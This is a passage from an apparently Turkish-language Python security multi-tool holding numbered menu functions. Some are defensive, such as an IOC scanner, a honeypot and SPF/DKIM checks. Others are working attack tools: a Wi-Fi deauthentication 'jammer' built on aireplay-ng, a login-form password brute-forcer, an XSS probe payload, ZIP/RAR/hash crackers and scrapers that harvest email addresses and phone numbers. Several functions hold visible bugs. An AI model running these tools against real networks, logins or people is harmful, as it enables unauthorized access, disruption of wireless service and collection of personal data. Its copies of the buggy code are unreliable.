            if hits: print(c("[MATCH] %s: %s"%(fp,hits),RED,True))
        except Exception: pass
    ok("[+] Tarama tamam.")

def tool_dns():
    print(c("\n[ 20 - DNS SECURITY CHECK ]",CYN,True))
    dom=input(c("Domain: ",YEL)).strip()
    try: ok("[+] A kaydi: %s"%socket.gethostbyname(dom))
    except Exception: warn("[-] Cozumlenemedi"); return
    def dig(*a):
        try:
            r=subprocess.run(["dig"]+list(a)+["+short"],capture_output=True,text=True,timeout=10)
            return [l for l in r.stdout.splitlines() if l.strip() and not l.startswith(";")]
        except Exception: return None
    mx=dig("MX",dom)
    if mx is None: warn("[!] dig yok (apt install dnsutils)")
    else: ok("[+] MX: %s"%(mx if mx else "YOK"))
    dk=dig("DNSKEY",dom)
    if dk is not None: ok("[+] DNSSEC: %s"%("AKTIF (%d DNSKEY)"%len(dk) if dk else "YOK"))

def tool_ioc():
    print(c("\n[ 21 - IOC SCANNER ]",CYN,True))
    pth=input(c("Yol: ",YEL)).strip(); iocf=input(c("IOC dosyasi [iocs.txt]: ",YEL)).strip() or "iocs.txt"
    if not os.path.exists(iocf): err("[!] IOC dosyasi yok"); return
    hashes,ips,doms=set(),set(),set()
    for line in open(iocf,errors="ignore"):
        v=line.strip()
        if not v or v.startswith("#"): continue
        if re.fullmatch(r"[0-9a-fA-F]{32,128}",v): hashes.add(v.lower())
        elif re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}",v): ips.add(v)
        else: doms.add(v.lower())
    targets=[pth] if os.path.isfile(pth) else [os.path.join(r,fn) for r,_,fs in os.walk(pth) for fn in fs]
    total=0
    for fp in targets:
        try:
            if hashlib.sha256(open(fp,"rb").read()).hexdigest() in hashes: print(c("[!] %s: HASH"%fp,RED,True)); total+=1
            head=open(fp,"rb").read(1048576).lower()
            for ip in ips:
                if ip.encode() in head: print(c("[!] %s: IP %s"%(fp,ip),RED,True)); total+=1
            for dm in doms:
                if dm.encode() in head: print(c("[!] %s: DOMAIN %s"%(fp,dm),RED,True)); total+=1
        except Exception: pass
    ok("[+] Bitti. Toplam: %d"%total)

def tool_honeypot():
    print(c("\n[ 22 - HONEYPOT ]",CYN,True))
    try:
        hp=int(input(c("HTTP port [8080]: ",YEL)) or "8080"); sp=int(input(c("SSH port [2222]: ",YEL)) or "2222")
    except ValueError: err("[!] Port hatali"); return
    LOG="honeypot.log"
    def log(proto,ip,port,data):
        e="[%s] %s | %s:%d | %s"%(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),proto,ip,port,(data or "")[:200])
        print(c(e,WHT)); open(LOG,"a").write(e+"\n")
    def serve(port,proto):
        s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.bind(("0.0.0.0",port)); s.listen(64); ok("[+] Sahte %s: 0.0.0.0:%d"%(proto,port))
        while True:
            conn,addr=s.accept()
            def handler(conn=conn,addr=addr):
                try:
                    data=conn.recv(4096); first=data.decode("utf-8","ignore").splitlines()[0] if data else ""
                    log(proto,addr[0],addr[1],first)
                    if proto=="HTTP": conn.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                except Exception: pass
                finally: conn.close()
            threading.Thread(target=handler,daemon=True).start()
    threading.Thread(target=serve,args=(hp,"HTTP"),daemon=True).start()
    threading.Thread(target=serve,args=(sp,"SSH"),daemon=True).start()
    info("[+] Log: %s (Ctrl+C)"%LOG)
    try:
        while True: time.sleep(3600)
    except KeyboardInterrupt: warn("\n[+] Kapatildi")

def tool_entropy():
    print(c("\n[ 23 - ENTROPY ANALYZER ]",CYN,True))
    pth=input(c("Yol: ",YEL)).strip()
    if not os.path.exists(pth): err("[!] Yok"); return
    def ent(d):
        if not d: return 0.0
        cnt=collections.Counter(d); n=len(d)
        return -sum((x/n)*math.log2(x/n) for x in cnt.values())
    targets=[pth] if os.path.isfile(pth) else [os.path.join(r,fn) for r,_,fs in os.walk(pth) for fn in fs]
    for fp in targets:
        try:
            e=ent(open(fp,"rb").read()); v="YUKSEK (sifreli)" if e>7.0 else "ORTA" if e>4.5 else "DUSUK"
            print(c("[+] %.2f [%s] %s"%(e,v,fp),CYN))
        except Exception: pass
    ok("[+] Tamam.")

def tool_baseconv():
    print(c("\n[ 24 - BASE CONVERTER ]",CYN,True))
    val=input(c("Deger: ",YEL)).strip(); frm=input(c("Kaynak taban [10]: ",YEL)).strip() or "10"
    to=input(c("Hedef taban [16]: ",YEL)).strip() or "16"
    bases={"2":2,"8":8,"10":10,"16":16}
    try:
        n=int(val,bases[frm]); out={2:bin,8:oct,10:str,16:hex}[int(to)](n)
        for p in ("0x","0o","0b"): out=out.replace(p,"")
        ok("[+] Sonuc: %s"%out)
    except Exception as e: err("[!] Hata: %s"%e)

def tool_subnet():
    print(c("\n[ 25 - SUBNET CALCULATOR ]",CYN,True))
    cidr=input(c("CIDR (192.168.1.0/24): ",YEL)).strip()
    try:
        n=ipaddress.ip_network(cidr,strict=False); hosts=list(n.hosts())
        ok("[+] Ag: %s"%n); ok("[+] Mask: %s | Wildcard: %s"%(n.netmask,n.hostmask)); ok("[+] Broadcast: %s"%n.broadcast_address)
        if hosts: ok("[+] Kullanilabilir: %s - %s (%d host)"%(hosts[0],hosts[-1],len(hosts)))
        ok("[+] Toplam: %d"%n.num_addresses)
    except Exception as e: err("[!] Hata: %s"%e)

def tool_hashgen():
    print(c("\n[ 26 - HASH GENERATOR ]",CYN,True))
    text=input(c("Metin: ",YEL)); algo=input(c("Algo [md5]: ",YEL)).strip() or "md5"
    fns={"md5":hashlib.md5,"sha1":hashlib.sha1,"sha256":hashlib.sha256,"sha512":hashlib.sha512}
    fn=fns.get(algo.lower())
    if not fn: err("[!] Bilinmeyen"); return
    ok("[+] %s: %s"%(algo.upper(),fn(text.encode()).hexdigest()))

def tool_macgen():
    print(c("\n[ 27 - MAC GENERATOR ]",CYN,True))
    n=int(input(c("Adet [5]: ",YEL)) or "5")
    for _ in range(n): ok("[+] 02:"+":".join("%02x"%random.randint(0,255) for _ in range(5)))

def tool_ipgen():
    print(c("\n[ 28 - IP GENERATOR ]",CYN,True))
    n=int(input(c("Adet [5]: ",YEL)) or "5")
    for _ in range(n): ok("[+] %d.%d.%d.%d"%tuple(random.randint(1,254) for _ in range(4)))

def tool_ssidgen():
    print(c("\n[ 29 - SSID GENERATOR ]",CYN,True))
    n=int(input(c("Adet [10]: ",YEL)) or "10")
    words=["admin","wifi","net","home","fiber","tp-link","guest","office","ev","modem","hotspot","wlan","data","air","speed"]
    for _ in range(n):
        w=random.sample(words,2); ok("[+] %s_%s%d"%(w[0],w[1],random.randint(1,99)))

# ==================== YENI ARACLAR 30-84 ====================
def tool_macch():
    print(c("\n[30 - MAC CHANGER]",CYN,True))
    iface=input(c("Arayuz [eth0]: ",YEL)).strip() or "eth0"
    new=":".join("%02x"%random.randint(0,255) for _ in range(6))
    shu("ip link set dev %s down"%iface); shu("ip link set dev %s address %s"%(iface,new)); shu("ip link set dev %s up"%iface)
    ok("[+] Yeni MAC: %s"%new)

def tool_ipch():
    print(c("\n[31 - IP CHANGER]",CYN,True))
    iface=input(c("Arayuz [eth0]: ",YEL)).strip() or "eth0"
    ip=input(c("IP (bos=DHCP): ",YEL)).strip()
    if ip: shu("ip addr flush dev %s && ip addr add %s/24 dev %s && ip link set %s up"%(iface,ip,iface,iface))
    else: shu("dhclient %s 2>/dev/null || dhcpcd %s"%(iface,iface))
    ok("[+] IP ayarlandi")

def tool_wifiscan():
    print(c("\n[32 - SSID SCANNER]",CYN,True))
    iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"
    shu("iwlist %s scan 2>/dev/null | grep -E 'ESSID|Signal level|Channel'"%iface)

def tool_bssidf():
    print(c("\n[33 - BSSID FINDER]",CYN,True))
    iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"
    target=input(c("Aranan SSID: ",YEL)).strip()
    shu("iwlist %s scan 2>/dev/null | awk '/ESSID:%s/{found=1} /Address/{if(found){print; found=0}}'|\"\" "%(iface,target) if target else "iwlist %s scan 2>/dev/null | grep -A1 'Cell'");

def tool_wifimon():
    print(c("\n[34 - WIFI MONITOR]",CYN,True))
    iface=input(c("Monitor arayuz [wlan0mon]: ",YEL)).strip() or "wlan0mon"
    shu("airmon-ng %s start %s 2>/dev/null"%(iface,iface)); shu("timeout 15 airodump-ng %s"%iface)

def tool_wpspin():
    print(c("\n[35 - WPS PIN GENERATOR]",CYN,True))
    ssid=input(c("SSID: ",YEL)).strip()
    ok("[+] SSID: %s"%(ssid or "(bos)"))
    for _ in range(5):
        p="%07d"%random.randint(0,9999999); ok("[+] WPS aday: %s"%(p[:4]+p[4:]))

def tool_wifijam():
    print(c("\n[36 - WIFI JAMMER]",CYN,True))
    iface=input(c("Arayuz [wlan0]: ",YEL)).strip() or "wlan0"
    bssid=input(c("Hedef BSSID: ",YEL)).strip()
    if bssid:
        shu("airmon-ng start %s"%iface); shu("aireplay-ng -0 0 -a %s %smon"%(bssid,iface))

def tool_netscan():
    print(c("\n[37 - NETWORK SCANNER]",CYN,True))
    cidr=input(c("CIDR (192.168.1.0/24): ",YEL)).strip()
    try: net=ipaddress.ip_network(cidr,strict=False)
    except Exception: err("[!] hata"); return
    from concurrent.futures import ThreadPoolExecutor
    ok("[+] Aktif hostlar:")
    def ping(ip): return ip if os.system("ping -c1 -W1 %s >/dev/null 2>&1"%ip)==0 else None
    with ThreadPoolExecutor(128) as ex:
        for r in ex.map(ping,net.hosts()):
            if r: ok("   %s"%r)

def tool_portsw():
    print(c("\n[38 - PORT SWEEP]",CYN,True))
    target=input(c("Hedef: ",YEL)).strip()
    common=[21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,6379,8080,8443,9200,27017]
    openp=[]
    for pr in common:
        with socket.socket() as s:
            s.settimeout(0.5)
            if s.connect_ex((target,pr))==0: openp.append(pr)
    ok("[+] Acik (%d): %s"%(len(openp),openp))

def tool_servscan():
    print(c("\n[39 - SERVICE SCAN]",CYN,True))
    host=input(c("Hedef: ",YEL)).strip()
    for pr in (21,22,25,80,110,143,443,3306,5432):
        with socket.socket() as s:
            s.settimeout(2)
            if s.connect_ex((host,pr))!=0: continue
            try:
                if pr in (443): 
                    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                    ss=ctx.wrap_socket(s,server_hostname=host); b=ss.recv(256)
                else:
                    if pr in (80,25,110): s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    b=s.recv(256)
                ok("[%d] %s"%(pr,b.decode("utf-8","ignore").strip()[:80] or "(banner yok)"))
            except Exception: ok("[%d] serviсi acik"%pr)
            s.close()

def tool_osfp():
    print(c("\n[40 - OS FINGERPRINT]",CYN,True))
    host=input(c("Hedef: ",YEL)).strip()
    for pr in (80,443):
        try:
            s=socket.create_connection((host,pr),timeout=4)
            if pr==443:
                ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                ss=ctx.wrap_socket(s,server_hostname=host); b=ss.recv(512)
            else:
                s.send(b"HEAD / HTTP/1.0\r\n\r\n"); b=s.recv(512)
            t=b.decode("utf-8","ignore"); s.close()
            for k in ("Debian","Ubuntu","Windows","nginx","Apache","Fedora","CentOS",):
                if re.search(k,t,re.I): warn("[%d] %s kokusu"% (pr,k))
            info("[%d] %s"%(pr,t[:70]))
        except Exception: pass

def tool_dnsbrut():
    print(c("\n[41 - DNS BRUTEFORCE]",CYN,True))
    dom=input(c("Domain: ",YEL)).strip(); wl=input(c("Wordlist: ",YEL)).strip()
    if wl and os.path.exists(wl): words=[l.strip() for l in open(wl,errors="ignore") if l.strip()]
    else: words=["www","mail","admin","api","dev","test","ftp","vpn","blog","shop"]
    from concurrent.futures import ThreadPoolExecutor
    def chk(w):
        try: return w+"."+dom,socket.gethostbyname(w+"."+dom)
        except Exception: return None
    n=0
    with ThreadPoolExecutor(100) as ex:
        for r in ex.map(chk,words):
            if r: ok("[+] %s -> %s"%r); n+=1
    ok("[+] Toplam: %d"%n)

def tool_rdns():
    print(c("\n[42 - REVERSE DNS]",CYN,True))
    ip=input(c("IP: ",YEL)).strip()
    try: ok("[+] %s -> %s"%(ip,socket.gethostbyaddr(ip)[0]))
    except Exception: err("[!] PTR kaydi yok")

def tool_mxlook():
    print(c("\n[43 - MX LOOKUP]",CYN,True))
    dom=input(c("Domain: ",YEL)).strip()
    try:
        r=subprocess.run(["dig","MX",dom,"+short"],capture_output=True,text=True,timeout=10)
        ok("[+] MX:\n%s"%r.stdout if r.stdout else "[-] MX yok")
    except Exception: err("[!] dig gerekli")

def tool_spf():
    print(c("\n[44 - SPF CHECK]",CYN,True))
    dom=input(c("Domain: ",YEL)).strip()
    try:
        r=subprocess.run(["dig","TXT",dom,"+short"],capture_output=True,text=True,timeout=10)
        m=[l for l in r.stdout.splitlines() if "v=spf1" in l]
        ok("[+] SPF: %s"%(m[0][:120] if m else "YOK")) if m else warn("[!] SPF YOK (spoofing riski)")
    except Exception: err("[!] dig gerekli")

def tool_dkim():
    print(c("\n[45 - DKIM CHECK]",CYN,True))
    dom=input(c("Domain: ",YEL)).strip()
    try:
        r=subprocess.run(["dig","TXT","default._domainkey."+dom,"+short"],capture_output=True,text=True,timeout=10)
        ok("[+] DKIM: %s"%(r.stdout.strip()[:120] if r.stdout.strip() else "YOK"))
    except Exception: err("[!] dig gerekli")

def tool_domage():
    print(c("\n[46 - DOMAIN AGE]",CYN,True))
    dom=input(c("Domain: ",YEL)).strip()
    try:
        r=subprocess.run(["whois",dom],capture_output=True,text=True,timeout=15)
        m=re.findall(r"(Creation Date|Registered On|Created On|created):\s*(.+)",r.stdout,re.I)
        if m: ok("[+] %s"%(m[0][1].strip()))
        else: warn("[-] Creation date bulunamadi")
    except Exception: err("[!] whois gerekli")

def tool_whois():
    print(c("\n[47 - WHOIS LOOKUP]",CYN,True))
    dom=input(c("Domain/IP: ",YEL)).strip()
    try:
        r=subprocess.run(["whois",dom],capture_output=True,text=True,timeout=15)
        print(c(r.stdout[:2500],WHT))
    except Exception: err("[!] whois gerekli")

def tool_geoip():
    print(c("\n[48 - GEOIP FINDER]",CYN,True))
    ip=input(c("IP: ",YEL)).strip()
    try:
        d=json.loads(fetch("http://ip-api.com/json/"+ip))
        if d.get("status")=="success": ok("[+] %s -> %s, %s, %s | ISP: %s | Org: %s"%(ip,d.get("country"),d.get("regionName"),d.get("city"),d.get("isp"),d.get("org")))
        else: err("[!] Bulunamadi: %s"%d)
    except Exception as e: err("[!] %s"%e)

def tool_ipcalc():
    print(c("\n[49 - IP CALCULATOR]",CYN,True))
    val=input(c("IP/mask orn 10.0.0.5/8: ",YEL)).strip()
    try:
        addr=m=val.split("/")[0]; m=int(val.split("/")[1]); ipa=ipaddress.ip_address(addr)
        info("[+] Ip: %s"%ipa); info("[+] Specify: %s ag binari %s"%("a.sinifi" if int(str(ipa).split(".")[0])<128 else "b" if int(str(ipa).split(".")[0])<192 else "c",""))
        warn("[+] /%d => %s Cidr noti"%(m,next(ipaddress.ip_network("0.0.0.0/"+str(m),strict=False).hosts()) if m else ""))
    except Exception as e: err(str(e))

def tool_macven():
    print(c("\n[50 - MAC VENDOR]",CYN,True))
    mac=input(c("MAC: ",YEL)).strip(); oui=mac.upper().replace(":","")[:6]
    try:
        v=fetch("https://api.macvendors.com/"+oui); ok("[+] Uretici: %s"%v)
    except Exception as e: err("[!] %s"%e)

def tool_subdump():
    print(c("\n[51 - SUBNET DUMP]",CYN,True))
    cidr=input(c("CIDR: ",YEL)).strip()
    try:
        n=ipaddress.ip_network(cidr,strict=False)
        ok("[+] %s (ilk 50):"%n)
        for i,ip in enumerate(n.hosts()):
            if i>=50: break
            print(c("   %s"%ip,CYN))
    except Exception as e: err(str(e))

def tool_arptab():
    print(c("\n[52 - ARP TABLE]",CYN,True))
    iface=input(c("Arayuz [eth0]: ",YEL)).strip() or "eth0"
    r=subprocess.run(["ip","neigh","show",iface] if iface else ["ip","neigh","show"],capture_output=True,text=True)
    ok(r.stdout if r.stdout else "[-] Bos") if r.stdout else warn("[-] Bos")

def tool_tracer():
    print(c("\n[53 - ROUTE TRACE]",CYN,True))
    host=input(c("Hedef: ",YEL)).strip()
    t="tracert"%()
    cmd="traceroute -m30 %s"%(host)
    shu(cmd)

def tool_ttl():
    print(c("\n[54 - TTL SCAN]",CYN,True))
    host=input(c("Hedef: ",YEL)).strip()
    for pr in (80,443,22):
        try:
            s=socket.create_connection((host,pr),timeout=4); ttl=s.getsockopt(socket.IPPROTO_IP,socket.IP_TTL); rr=s.getsockname()[0]
            warn("[%d] TTL %d (OS: %s)"%(pr,ttl,"Linux/Unix <129, Windows>128" if ttl<129 else "Windows-ish"))
            s.close()
        except Exception: pass

def tool_httphead():
    print(c("\n[55 - HTTP HEADER ANALIZ]",CYN,True))
    url=input(c("URL: ",YEL)).strip()
    try:
        req=urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"},method="HEAD")
        r=urllib.request.urlopen(req,timeout=8)
        for k,v in r.headers.items():
            flag=""
            if k.lower() in ("server","x-powered-by","x-aspnet-version"): flag=c("  [YLEAK] bilgi sizdiriyor",RED,True)
            print(c("  %s: %s"%(k,v),WHT)+flag)
    except Exception as e: err("[!] %s"%e)

def tool_cookiegrab():
    print(c("\n[56 - COOKIE INCELE]",CYN,True))
    url=input(c("URL: ",YEL)).strip()
    import http.cookiejar
    cj=http.cookiejar.CookieJar(); opener=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    try:
        opener.open(urllib.request.Request(url,headers={"User-Agent":"Mozilla/5.0"}),timeout=8)
        if not cj: warn("[-] Cookie yok")
        for ck in cj: warn("[cookie] %s = %s"%(ck.name,ck.value[:40]))
    except Exception as e: err(str(e))

def tool_adminfind():
    print(c("\n[57 - ADMIN FINDER]",CYN,True))
    url=input(c("URL (http://site): ",YEL)).strip()
    paths=["admin","login","wp-admin","phpmyadmin","dashboard","panel","administrator","admin.php","user","cpanel","plesk"]
    for p in paths:
        st=http_status(url.rstrip("/")+"/"+p)
        if st and st<400: ok("[+] %d %s"%(st,p))
    ok("[+] Bitti")

def tool_loginbrute():
    print(c("\n[58 - LOGIN FORM BRUTE]",CYN,True))
    url=input(c("POST URL: ",YEL)).strip(); uf=input(c("Username param: ",YEL)).strip(); pf=input(c("Password param: ",YEL)).strip()
    wl=input(c("Wordlist: ",YEL)).strip()
    if not os.path.exists(wl): err("[!] yok"); return
    data=dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query))
    for line in open(wl,errors="ignore"):
        p=line.strip()
        if not p: continue
        data[uf]="admin"; data[pf]=p
        try:
            req=urllib.request.Request(url,data=urllib.parse.urlencode(data).encode(),headers={"User-Agent":"Mozilla/5.0"})
            body=urllib.request.urlopen(req,timeout=8).read().decode("utf-8","ignore")
            if "incorrect" not in body.lower() and "error" not in body.lower() and len(body)>100: print(c("[+] OLASI GECERLI: %s"%p,GRN,True))
        except Exception: pass
    warn("[-] bitti (admin)")

def tool_formxss():
    print(c("\n[59 - FORM XSS PROBE]",CYN,True))
    url=input(c("URL: ",YEL)).strip(); body=fetch(url)
    forms=re.findall(r'<form[^>]*action="([^"]*)"[^>]*>',body,re.I)
    inputs=re.findall(r'<input[^>]*name="([^"]*)"',body,re.I)
    info("[*] %d form, inputlar: %s"%(len(forms),inputs[:6]))
    if inputs:
        for inp in inputs[:3]:
            data={inp:"<script>alert(1)</script>"}
            try:
                req=urllib.request.Request(url,data=urllib.parse.urlencode(data).encode(),headers={"User-Agent":"Mozilla/5.0"})
                rb=urllib.request.urlopen(req,timeout=8).read().decode("utf-8","ignore")
                if "<script>alert(1)</script>" in rb: print(c("[!] XSS aday: %s"%inp,RED,True))
            except Exception: pass
    ok("[+] Bitti")

def tool_htmlparse():
    print(c("\n[60 - HTML PARSER]",CYN,True))
    url=input(c("URL: ",YEL)).strip()
    body=fetch(url)
    for tag in ("title","h1","h2","meta"):
        vals=re.findall(r'<%s[^>]*(.*?)</%s>'%(tag,tag),body,re.I|re.S)
        txts=[re.sub(r'<[^>]+>','',v).strip() for v in vals]
        txts=[t for t in txts if t]
        if txts: ok("[%s] %s"%(tag,", ".join(txts[:4])))
    metas=re.findall(r'<meta[^>]*name="([^"]*)"[^>]*content="([^"]*)"',body,re.I)
    for name,cont in metas[:8]: info("  meta %s: %s"%(name,cont[:60]))
    if not body: warn("[-] Bos")

def tool_linkext():
    print(c("\n[61 - LINK EXTRACTOR]",CYN,True))
    url=input(c("URL: ",YEL)).strip(); body=fetch(url)
    links=sorted(set(urllib.parse.urljoin(url,m) for m in re.findall(r'href="([^"#]+)"',body,re.I)))
    ok("[+] %d baglanti (ilk 25):"%len(links))
    for l in links[:25]: print(c("   %s"%l,CYN))

def tool_emailharv():
    print(c("\n[62 - EMAIL HARVESTER]",CYN,True))
    url=input(c("URL: ",YEL)).strip()
    body=fetch(url)
    em=set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",body))
    rank={}
    for e in em:
        d=e.split("@")[1]
        rank[d]=rank.get(d,0)+1
    ok("[+] %d e-posta:"%len(em))
    for e in sorted(em)[:30]: print(c("   %s"%e,WHT))
    if rank:
        top=max(rank,key=rank.get); info("[+] En cok: %s (%d)"%(top,rank[top]))

def tool_phoneharv():
    print(c("\n[63 - PHONE HARVESTER]",CYN,True))
    url=input(c("URL: ",YEL)).strip()
    body=fetch(url)
    nums=set(re.findall(r'(?<!\d)(?:\+?\d{1,3}[\s.-]?)?(?:\(?\d{3}\)?[\s.-]?)\d{3}[\s.-]?\d{4}',body))
    ok("[+] %d telefon:"%len(nums))
    for n in sorted(nums)[:20]: print(c("   %s"%n,WHT))

def tool_osintuser():
    print(c("\n[64 - OSINT USERNAME]",CYN,True))
    user=input(c("Kullanici adi: ",YEL)).strip()
    sites={"GitHub":"https://github.com/%s"%user,"Twitter":"https://twitter.com/%s"%user,"Reddit":"https://www.reddit.com/user/%s"%user,"Instagram":"https://www.instagram.com/%s"%user,"GitLab":"https://gitlab.com/%s"%user}
    from concurrent.futures import ThreadPoolExecutor
    def chk(item):
        name,u=item
        try:
            req=urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"})
            return name,u,urllib.request.urlopen(req,timeout=6).getcode()
        except urllib.error.HTTPError as e: return name,u,e.code
        except Exception: return name,u,None
    with ThreadPoolExecutor(5) as ex:
        for name,u,code in ex.map(chk,sites.items()):
            if code and code<404: ok("[+] %s: %s (HTTP %d)"%(name,u,code))

def tool_paste():
    print(c("\n[65 - PASTEBIN ARAMA]",CYN,True))
    q=input(c("Aranan: ",YEL)).strip()
    try:
        r=subprocess.run(["trufflehog","--no-update"],capture_output=True,text=True)
        pass
    except Exception: info("[*] trufflehog yok - manuel: search.pastebin.com")
    warn("[*] Pastebin arama API anonim sinirli - manuel kontrol onerilir")

def tool_gitdork():
    print(c("\n[66 - GITHUB DORK]",CYN,True))
    q=input(c("Arama: ",YEL)).strip()
    try:
        u="https://api.github.com/search/code?q="+urllib.parse.quote(q)
        req=urllib.request.Request(u,headers={"User-Agent":"Mozilla/5.0"})
        d=json.loads(urllib.request.urlopen(req,timeout=10).read())
        for it in d.get("items",[])[:10]: ok("[+] %s"%it.get("html_url"))
        if not d.get("items"): warn("[-] Sonuc yok (API auth gerekebilir)")
    except Exception as e: err("[!] GitHub API: %s"%e)

def tool_gdork():
    print(c("\n[67 - GOOGLE DORK]",CYN,True))
    q=input(c("Dork: ",YEL)).strip()
    try:
        u="http://www.google.com/search?q="+urllib.parse.quote(q)
        body=fetch(u)
        links=re.findall(r'<a href="/url\?q=([^"&]+)',body)
        links=[l for l in links if l.startswith("http")]
        ok("[+] %d sonuc:"%len(links))
        for l in links[:10]: print(c("   %s"%l,WHT))
        if not links: warn("[-] Bloklandi/degisti - sonuc yok")
    except Exception as e: err(str(e))

def tool_shodan():
    print(c("\n[68 - SHODAN CHECK]",CYN,True))
    ip=input(c("IP: ",YEL)).strip(); key=input(c("API key (opsiyonel): ",YEL)).strip()
    try:
        if key:
            req=urllib.request.Request("https://api.shodan.io/shodan/host/"+ip+"?key="+key,headers={"User-Agent":"Mozilla/5.0"})
            d=json.loads(urllib.request.urlopen(req,timeout=10).read())
            ok("[+] Portlar: %s"%d.get("ports")); ok("[+] Org: %s"%d.get("org"))
        else:
            u="https://internetdb.shodan.io/"+ip
            d=json.loads(fetch(u))
            ok("[+] Acik portlar: %s"%d.get("ports",[])); ok("[+] Turbo: %s"%d.get("hostnames",[])); ok("[+] CPE: %s"%d.get("cpes",[]))
    except Exception as e: err("[!] %s"%e)

def tool_passgen():
    print(c("\n[69 - PASSWORD GENERATOR]",CYN,True))
    ln=int(input(c("Uzunluk [16]: ",YEL)) or "16")
    chars="ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789!@#$%^&*"
    for _ in range(5): ok("[+] "+"".join(random.choice(chars) for _ in range(ln)))

def tool_wlgen():
    print(c("\n[70 - WORDLIST GENERATOR]",CYN,True))
    out=input(c("Cikti dosyasi [words.txt]: ",YEL)).strip() or "words.txt"
    base=input(c("Ana kelime: ",YEL)).strip()
    nn=int(input(c("Rakam adedi [4]: ",YEL)) or "4")
    syms=["","!","@","#"]
    with open(out,"w") as f:
        for i in range(10**nn):
            f.write(base+("%0*d"%(nn,i))+"\n")
        for s in syms:
            for i in range(10**nn): f.write(base+s+"%0*d"%(nn,i)+"\n")
    ok("[+] %s uretildi (2x %d aday)"%(out,10**nn))

def tool_md5dict():
    print(c("\n[71 - MD5 DICT]",CYN,True))
    h=input(c("MD5: ",YEL)).strip(); wl=input(c("Wordlist: ",YEL)).strip()
    if not os.path.exists(wl): err("[!] yok"); return
    for l in open(wl,errors="ignore"):
        w=l.strip()
        if w and hashlib.md5(w.encode()).hexdigest()==h: ok("[+] KIRILDI: %s"%w); return
    warn("[-] yok")

def tool_sha1brut():
    print(c("\n[72 - SHA1 BRUTE]",CYN,True))
    h=input(c("SHA1: ",YEL)).strip()
    info("[*] 4 haneli sayisal brute deneniyor...")
    for i in range(10000):
        if hashlib.sha1(("%04d"%i).encode()).hexdigest()==h: ok("[+] KIRILDI: %04d"%i); return
    warn("[-] 4 hane bulunamadi (daha uzun icin wordlist kullan)")

def tool_zipcrack():
    print(c("\n[73 - ZIP CRACKER]",CYN,True))
    zp=input(c("Zip: ",YEL)).strip(); wl=input(c("Wordlist: ",YEL)).strip()
    if not (os.path.exists(zp) and os.path.exists(wl)): err("[!] yok"); return
    import zipfile
    z=zipfile.ZipFile(zp)
    for l in open(wl,errors="ignore"):
        p=l.strip()
        if not p: continue
        try: z.setpassword(p.encode()); z.testzip(); ok("[+] PAROLA: %s"%p); return
        except Exception: pass
    warn("[-] bulunamadi")

def tool_rarcrack():
    print(c("\n[74 - RAR CRACKER]",CYN,True))
    rfile=input(c("RAR: ",YEL)).strip()
    if not shutil.which("unrar"): err("[!] unrar yok: sudo apt install unrar"); return
    wl=input(c("Wordlist: ",YEL)).strip()
    if not os.path.exists(wl): err("[!] yok"); return
    for l in open(wl,errors="ignore"):
        p=l.strip()
        if not p: continue
        with open("/tmp/wp.txt","w") as f: f.write(p)
        r=subprocess.run(["unrar","t","-p"+p,rfile],capture_output=True)
        if r.returncode==0: ok("[+] PAROLA: %s"%p); return
    warn("[-] bulunamadi")

def tool_xor():
    print(c("\n[75 - XOR DECODE]",CYN,True))
    data=input(c("Hex/ascii: ",YEL)).strip()
    key=input(c("Anahtar: ",YEL)).strip()
    try:
        raw=bytes.fromhex(data) if all(c in "0123456789abcdef" for c in data) else data.encode()
        kb=key.encode() or b"\x41"
        out="".join(chr(b^kb[i%len(kb)]) for i,b in enumerate(raw))
        ok("[+] XOR sonuc: %s"%out)
    except Exception as e: err(str(e))

def tool_caesar():
    print(c("\n[76 - CAESAR CIPHER]",CYN,True))
    text=input(c("Metin: ",YEL)); shift=int(input(c("Kaydirma [3]: ",YEL)) or "3")
    res=""
    for ch in text:
        if ch.isalpha():
            base=ord('A') if ch.isupper() else ord('a'); res+=chr((ord(ch)-base+shift)%26+base)
        else: res+=ch
    ok("[+] Sonuc: %s"%res)

def tool_b64e():
    print(c("\n[77 - BASE64 ENCODE]",CYN,True))
    t=input(c("Metin: ",YEL)); ok("[+] "+base64.b64encode(t.encode()).decode())

def tool_b64d():
    print(c("\n[78 - BASE64 DECODE]",CYN,True))
    t=input(c("Base64: ",YEL)).strip()
    try: ok("[+] "+base64.b64decode(t).decode("utf-8","ignore"))
    except Exception as e: err(str(e))

def tool_hexdump():
    print(c("\n[79 - HEX DUMP]",CYN,True))
    fp=input(c("Dosya: ",YEL)).strip()
    if not os.path.exists(fp): err("[!] yok"); return
    data=open(fp,"rb").read(512)
    for i in range(0,len(data),16):
        chunk=data[i:i+16]
        hexs=" ".join("%02x"%b for b in chunk)
        asc="".join(chr(b) if 32<=b<127 else "." for b in chunk)
        print(c("%04x  %-48s  %s"%(i,hexs,asc),CYN))

def tool_qr():
    print(c("\n[80 - QR GENERATE]",CYN,True))
    data=input(c("Veri/URL: ",YEL)).strip()
    try:
        import qrcode
        img=qrcode.make(data); img.save("qr.png"); ok("[+] qr.png olusturuldu")
    except ImportError:
        err("[!] qrcode gerekli: pip install qrcode")

def tool_steg():
    print(c("\n[81 - STEGANOGRAFI EXTRACT]",CYN,True))
    img=input(c("Resim: ",YEL)).strip()
    if not os.path.exists(img): err("[!] yok"); return
    try:
        from PIL import Image
        im=Image.open(img).convert("RGB"); px=im.load(); bits=[]; msg=""
        for y in range(im.size[1]):
            for x in range(im.size[0]):
